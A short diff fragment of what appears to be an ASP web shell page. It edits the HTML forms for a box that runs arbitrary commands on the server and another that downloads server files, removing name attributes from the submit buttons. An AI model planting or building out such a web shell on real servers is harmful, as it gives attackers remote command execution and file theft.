@@ -73,7 +73,7 @@ end sub
     <body>
         <form id="cmdForm" method="POST" action="">
             <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
-            <input type="submit" name="cmdSubmit" value="Run" />
+            <input type="submit" value="Run" />
         </form>
         <div class="infoText">
 <%
@@ -105,7 +105,7 @@ End If
             </div>
             <form method="POST" action="">
                 <input type="text" name="downloadFile" placeholder="File to download" />
-                <input type="submit" name="downloadSubmit" value="Download" />
+                <input type="submit" value="Download" />
             </form>
         </div>
         <script>
